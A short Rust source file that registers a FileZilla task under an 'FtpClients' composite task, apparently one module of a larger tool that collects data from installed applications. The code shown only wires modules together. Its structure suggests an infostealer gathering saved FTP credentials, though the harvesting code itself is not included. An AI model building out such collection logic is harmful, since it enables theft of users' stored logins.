#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;
mod filezilla;

use crate::filezilla::FileZillaTask;
use alloc::borrow::ToOwned;
use alloc::vec;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};

pub struct FtpTask {
    inner: CompositeTask
}

impl FtpTask {
    pub fn new() -> Self {
        Self {
            inner: composite_task!(
                FileZillaTask
            )
        }
    }
}

impl_composite_task_runner!(FtpTask, "FtpClients");